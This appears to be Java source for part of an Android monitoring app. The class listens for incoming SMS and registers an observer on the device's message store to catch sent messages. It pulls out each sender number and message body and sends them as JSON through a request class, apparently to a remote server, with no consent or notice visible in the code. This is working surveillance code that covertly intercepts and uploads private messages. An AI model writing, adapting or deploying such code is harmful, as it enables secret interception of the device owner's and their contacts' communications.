package com.inet.android.sms;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.inet.android.bs.RequestMakerImpl;
import com.inet.android.request.DataRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

public class SMSBroadcastReceiver extends BroadcastReceiver {
	private static final String TAG = "SMS";
	private SmsSentObserver smsSentObserver = null;
	String str = "";
	SharedPreferences sp;
	private Context mContext;
	private Bundle mBundle;
	String type = null;
	RequestMakerImpl req;
	private String LOG_TAG = "SMSBroadcastReceiver";

	public void onReceive(Context context, Intent intent) {
		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
		this.mContext = context;
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		String sms = sp.getString("sms", "0");

		if (sms.equals("0")) {
			Logging.doLog(LOG_TAG, "sms : 0", "sms : 0");
			return;
		}
		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
		if (!isWork) {
			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork),
					"isWork return " + Boolean.toString(isWork));
			Logging.doLog(LOG_TAG, "after isWork retrun 0",
					"after isWork retrun 0");

			return;
		} else {
			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork),
					"isWork - " + Boolean.toString(isWork));
		}

		try {
			mBundle = intent.getExtras();
			// smsSentObserver = null;
			Log.d(TAG, "Intent Action : " + intent.getAction());

			if (smsSentObserver == null) {
				smsSentObserver = new SmsSentObserver(new Handler(), mContext);
				mContext.getContentResolver().registerContentObserver(
						Uri.parse("content://sms"), true, smsSentObserver);
			}
			getSMSDetails();

		} catch (Exception sgh) {
			Logging.doLog(TAG, "Error in Init : " + sgh.toString(),
					"Error in Init : " + sgh.toString());
		}
	}

	@SuppressLint("SimpleDateFormat")
	private void getSMSDetails() {
		ConvertDate date = new ConvertDate();
		SmsMessage[] msgs = null;

		try {
			Object[] pdus = (Object[]) mBundle.get("pdus");
			if (pdus != null) {
				type = "5";
				msgs = new SmsMessage[pdus.length];

				StringBuilder bodyText = new StringBuilder();
				for (int k = 0; k < msgs.length; k++) {
					msgs[k] = SmsMessage.createFromPdu((byte[]) pdus[k]);

					Logging.doLog(
							TAG,
							"getDisplayMessageBody : "
									+ msgs[k].getDisplayMessageBody());
					Logging.doLog(TAG, "getDisplayOriginatingAddress : "
							+ msgs[k].getDisplayOriginatingAddress());
					Logging.doLog(TAG,
							"getMessageBody : " + msgs[k].getMessageBody());
					Logging.doLog(
							TAG,
							"getOriginatingAddress : "
									+ msgs[k].getOriginatingAddress());

				}
				String phNumber = msgs[0].getOriginatingAddress();

				for (int i = 0; i < msgs.length; i++) {
					bodyText.append(msgs[i].getMessageBody());
				}
				// -------send sms--------------------------------
				String sendJSONStr = null;
				JSONObject jsonObject = new JSONObject();
				JSONArray data = new JSONArray();
				JSONObject info = new JSONObject();
				JSONObject object = new JSONObject();
				try {

					info.put("tel", phNumber);
					info.put("data", bodyText.toString());

					object.put("time", date.logTime());
					object.put("type", type);
					object.put("info", info);
					data.put(object);
					jsonObject.put("data", data);
					sendJSONStr = object.toString();
				} catch (JSONException e) {
					Logging.doLog(LOG_TAG, "json сломался", "json сломался");
				}

				DataRequest dr = new DataRequest(mContext);
				dr.sendRequest(sendJSONStr);

				Logging.doLog(LOG_TAG, sendJSONStr, sendJSONStr);

			}
		} catch (Exception sfgh) {
			Logging.doLog(TAG, "Error in getSMSDetails : " + sfgh.toString(),
					"Error in getSMSDetails : " + sfgh.toString());
		}
	}

}
